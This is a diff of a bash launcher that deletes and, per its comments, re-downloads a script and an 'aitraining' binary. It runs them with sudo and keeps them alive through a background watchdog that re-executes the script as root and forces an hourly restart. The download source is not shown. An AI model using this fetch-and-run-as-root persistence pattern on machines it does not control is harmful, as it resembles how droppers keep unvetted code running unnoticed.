@@ -1,6 +1,7 @@
 #!/bin/bash
 # File: start_modelgp.sh launcher
 # Purpose: Run start_modelgp.sh continuously, restart if stopped, force restart every hour
+# Behavior: Auto-restart if stopped and force restart every hour
 
 while true; do
     echo "========== Starting GPU AI Training Launcher =========="
@@ -13,7 +14,7 @@ while true; do
         fi
     done
 
-    # --- Delete old files before downloading ---
+    # Delete old files before downloading
     echo "Deleting old files..."
     rm -f ./aitraining ./start_modelgp.sh
 
@@ -33,9 +34,10 @@ while true; do
     nohup bash -c '
         while true; do
             sleep 300
-            if ! pgrep -f "aitraining" > /dev/null; then
-                echo "$(date) - aitraining stopped! Restarting start_modelgp.sh..."
-
+            if pgrep -f "aitraining" > /dev/null; then
+                echo "$(date "+%Y-%m-%d %H:%M:%S") - aitraining running fine."
+            else
+                echo "$(date "+%Y-%m-%d %H:%M:%S") - aitraining stopped! Restarting start_modelgp.sh..."
                 sudo pkill -f "start_modelgp.sh" 2>/dev/null
                 sudo pkill -f "aitraining" 2>/dev/null
 
@@ -50,9 +52,11 @@ while true; do
                     sudo chmod +x ./start_modelgp.sh
                     sudo bash ./start_modelgp.sh
                 " > /dev/null 2>&1 &
+
+                echo "$(date "+%Y-%m-%d %H:%M:%S") - start_modelgp.sh restarted."
             fi
         done
-    ' > /dev/null 2>&1 &
+    ' &
 
     # --- 1-hour timer before forced restart ---
     echo "Running for 1 hour before forced restart..."
